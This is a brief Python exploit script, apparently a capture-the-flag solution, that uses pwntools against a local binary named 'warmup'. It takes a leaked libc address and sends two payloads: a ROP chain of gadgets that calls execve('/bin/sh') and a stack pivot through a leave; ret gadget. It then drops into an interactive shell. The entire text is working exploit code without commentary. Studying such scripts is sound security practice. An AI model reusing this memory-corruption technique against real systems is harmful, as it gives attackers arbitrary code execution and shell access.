#!/usr/bin/python3
from pwn import process, p64

shell = process("./warmup")

libc_base = int(shell.recvline().strip(), 16) - 0x87bd0

payload1  = b""
payload1 += b"A" * 8                  # padding for leave
payload1 += p64(libc_base + 0x10f75b) # pop rdi; ret;
payload1 += p64(libc_base + 0x1cb42f) # "/bin/sh"
payload1 += p64(libc_base + 0x110b7c) # pop rsi; ret;
payload1 += p64(0x0)                  # NULL
payload1 += p64(libc_base + 0x0dd237) # pop rax; ret;
payload1 += p64(0x3b)                 # execve()
payload1 += p64(libc_base + 0x11b71f) # mov rdx, rsi; xor esi, esi; syscall;

payload2  = b""
payload2 += b"B" * 64
payload2 += p64(0x404060)            # payload1
payload2 += p64(libc_base + 0x299d2) # leave; ret;

shell.sendlineafter(b">>", payload1)
shell.sendlineafter(b">>", payload2)

shell.recvline()
shell.interactive()
